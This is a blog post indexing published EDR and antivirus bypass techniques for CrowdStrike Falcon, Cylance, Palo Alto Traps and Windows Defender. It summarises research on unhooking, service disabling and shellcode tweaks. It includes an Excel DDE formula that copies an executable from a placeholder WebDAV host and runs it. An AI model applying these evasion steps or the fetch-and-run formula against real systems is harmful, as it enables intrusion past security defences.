---
title: "Endpoint Protection, Detection and Response Bypass Techniques Index"
date: 2019-01-15T17:50:00+07:00
author: "P. Boonyakarn"
description: "I've recently seen a bunch of articles and researches on endpoint protection and endpoint detection and response bypass techniques, so I decided to spend my research time to do document about these techniques and how was it done in summary. There is no category on these techniques as far as I know so I will simply categorize techniques by products."
---

I've recently seen a bunch of articles and researches on endpoint protection and endpoint detection and response bypass techniques, so I decided to spend my research time to do document about these techniques and how was it done in summary. There is no category on these techniques as far as I know so I will simply categorize techniques by products.

Before we begin, I would like to point out to another [great](http://www.hexacorn.com/blog/2018/02/25/endpoint-detection-and-response-edr-solutions-sheet-update-2/) [research](http://www.hexacorn.com/blog/2016/08/07/edr-sheet-explained/) from @Hexacorn on a review of current EDR solutions on the market. This spreadsheet presents EDRs features and capabilities in summary which is useful to utilize as targets to evade and bypass.

## CrowdStrike Falcon

tr4cefl0w posted on [0x00sec forum](https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/1) on a technique to completely bypass Falcon detection capability. The technique is including the following steps:

- He achieved code execution via Dynamic Data Exchange (DDE) in Excel because Microsoft has already patched and disabled the feature in December 2017. The formula used to leverage this attack is simple `=cmd|'/c notepad.exe'!_xlbgnm.A1`
- He utilized WebDAV server to drop a dropper, which is `nc.exe`. Apache2 with `mod_webdave` module enabled is used in this step. The embedded formula must be changed to something like `=cmd|'/c cmd.exe /c "copy \\x.x.x.x\webdav\run.txt c:\users\public\run.exe" && cmd.exe /c "c:\users\public\run.exe"'!_xlbgnm.A1`
- Unbelievably, it just works when he tried to simulate victim by open the attachment from email and allow embedded to execute
  
Komodo Research [describes](https://www.komodosec.com/post/bypassing-crowdstrike) three ways to bypass CrowdStrike falcon:

- With LOCAL SYSTEM, they can just disable user-mode service `CSFalconService` with net command which will prevent remote remediation from the console.
- They have a theory on not to leave things CrowdStrike will detect. To practice this theory, they create a reverse dynamic port forwarding tunnel on internal compromised machine. Thus, they can use the compromised machine to access the internal network without alerting from CrowdStrike Falcon.
- They just installed Qemu on the internal compromised machine for internal discovery and lateral movement.

## Cylance

MDSec [covers](https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/) many interesting points for Cylance:

- The main feature focuses on blocking malicious script such as Windows Scripting, Powers and Office macros [doesn't cover](https://vimeo.com/322902013) Excel 4.0 macros which is not much well known feature compared to VBA macros. More on [weaponizing Excel 4.0 macros](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/).
- For Windows Scripting such as VBScript and JavaScript, it turns out that Cylance will only enforce their Scripting Control feature only an execution originally from `wscript.exe`. MDSec used this flaw by [executing malicious JavaScript with `mshta.exe`](https://vimeo.com/322903302). 
- For Memory Protections feature, Cylance injects `CyMemdef.dll` and `CyMemDef64.dll`to a process. When a malicious process is executing, hooks placed by these DLLs will use to detect execution of a suspicious function. From this fact, MDSec created a function to unhook Cylance's DLL from DLL export.
- Cylance also offers Application Control feature to prevent risky applications execution such as PowerShell. Cylance still uses the same technique as described on Memory Protections to enforce policies. MDSec found that inside `CyMemdef.dll` and `CyMemDef64.dll`, there is a function which compares the executable's name with something like `PowerShell.exe`. These DLLs also check for existence of reference to `powershell.pdb` in PE debug directory. If these two conditions are true, `CyMemDefPS64.dll` will be loaded to send a warning message. Thus, MDSec spawned PowerShell process with `CREATE_SUSPEND` flag and modify the reference to PDB before resuming an execution, resulting as bypassing Application Control feature.
- MDSec also found a way to bypass VBA execution protection. By analyzing Cylance, MDSec discovered that Cylance adds hooks to VBA runtime, for example, `VBE7.dll` which contains functions such as Shell and CreateObject. By the way, Cylance did nothing with the exposed COM object. So, MDSec just directly enabled Windows Script Host Object Model on VBA project to use `WshShell` object to bypass hooked `CreateObject`.
- Isolation feature on Cylance OPTICS stores an unlock key on `HKEY_LOCAL_MACHINE\SOFTWARE\Cylance\Optics\PdbP` which can be simply decrypted using DPAPI master key available on Cylance OPTIOCS assemblies. The Isolation feature can also be bypassed by executing `CyOptics.exe` control `unlock-net` without providing key from LOCAL SYSTEM.

Hoang Bui [pointed out](https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6) about hooking and bypassing techniques on `CyMemDef64.dll`

## Palo Alto Traps
[@c0d3xpl0it](https://www.c0d3xpl0it.com/2019/01/bypassing-paloalto-traps-edr-solution.html) at Bits of Security wrote a blog to present an idea to bypass Traps. The technique utilized built-in tool `FLTMC.exe` which can be used to manage filter driver to unload Traps' file monitoring filter driver. The technique required administrator privilege to issue the commands.

## Windows Defender

Mantvydas Baranauskas at [Red Teaming Experiments](https://ired.team/offensive-security/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change) presented an idea to modify shellcode in purpose of evading detection, which I personally think that it is similar but not the same to Ghost Writing technique I learnt on SEC504. This technique can be accomplished by changing parts of shellcode to avoid some kind of pattern detection, and flip it back before deploying to the allocated memory.